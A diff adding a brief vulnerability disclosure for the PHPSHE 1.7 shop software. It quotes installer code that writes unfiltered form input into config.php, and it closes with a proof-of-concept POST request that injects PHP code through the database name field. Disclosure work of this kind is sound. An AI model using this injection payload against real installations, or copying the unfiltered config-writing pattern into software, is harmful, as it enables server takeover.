@@ -1,0 +1,33 @@
+# By pull
+
+Code Execution：
+    The code did not filter the configuration information during the installation process.so that any code can be written to the configuration file.when filling in the database configuration, the data table prefix can be modified to write malicious code.
+
+'''
+
+
+Source:
+		  /install/index.php:26-31
+
+						if ($result) {
+				$db->query("update `{$_p_dbpre}admin` set `admin_name` = '{$_p_admin_name}', `admin_pw` = '".md5($_p_admin_pw)."' where `admin_id`=1", $dbconn);
+				$config = "<?php\n\$pe['db_host'] = '{$_p_db_host}'; //数据库主机地址\n
+				\$pe['db_name'] = '{$_p_db_name}'; //数据库名称\n
+				\$pe['db_user'] = '{$_p_db_user}'; //数据库用户名\n
+				\$pe['db_pw'] = '{$_p_db_pw}'; //数据库密码\n
+				\$pe['db_coding'] = 'utf8';\n
+				\$pe['url_model'] = 'pathinfo_safe'; //url模式,可选项(pathinfo/pathinfo_safe/php)\n
+				define('dbpre','{$_p_dbpre}'); //数据库表前缀\n?>";
+				file_put_contents("{$pe['path_root']}config.php", $config);
+				pe_goto("{$pe['host_root']}install/index.php?step=success");
+			}
+
+	Affected software:PHPSHE <=1.7
+	Software Link: http://www.phpshe.com/down/phpshe1.7.rar
+
+'''
+
+exploit:
+http://localhost/install/index.php?step=setting
+POST 
+db_host=127.0.0.1&db_port=8889&db_user=root&db_pw=root&db_name=';phpinfo();'&dbpre=pe_&admin_name=admin&admin_pw=admin&pesubmit=
